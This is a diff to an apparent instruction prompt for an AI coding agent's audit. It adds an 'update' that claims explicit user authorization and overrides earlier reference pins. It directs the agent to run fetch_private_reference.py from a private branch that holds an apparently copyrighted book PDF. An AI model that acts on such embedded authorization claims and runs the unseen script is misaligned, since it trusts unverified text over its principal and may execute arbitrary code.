@@ -1,3 +1,9 @@
+CURRENT PRIVATE REFERENCE UPDATE — 2026-10-19T01:30:57.437018+00:00
+
+The user has explicitly authorized private GitHub storage of the new reference. Before auditing,read audit/claude-code-comprehensive-2026-10-19/PRIVATE_REFERENCE_ACCESS.md and run its fetch_private_reference.py helper from the updated checkout. Book storage is isolated on private branch private-reference/penguin-2bcc0c45,commit df76700be64b9fe409dd02f7b5d0c8903a910517;do not merge it.
+
+The current newly supplied PDF is 13596737bytes,SHA256 2bcc0c45fac4508adf283f4dd939a7e578cf2c1306fdadf4966300532beb6303. It differs from the earlier0c441ffd/13572361-byte input. This update selects the new user-supplied input for the current audit;older reference-pin statements in the historical instructions below describe different bytes and do not establish continuity. Record the actual new input and independently check edition/alignment. Keep the local PDF/extracted prose outside the project and result archives. Application target dc8aa6effa931cf0ba554042b92d49ef5e4a4b72 is unchanged.
+
 # Claude Code comprehensive independent audit — copy and paste
 
 Requested configuration: Claude Code, Opus 5.5, Extra effort. Confirm the actual client model/version/effort; do not invent a model ID or unsupported flags or silently substitute another model. This request prepares audit reports only.
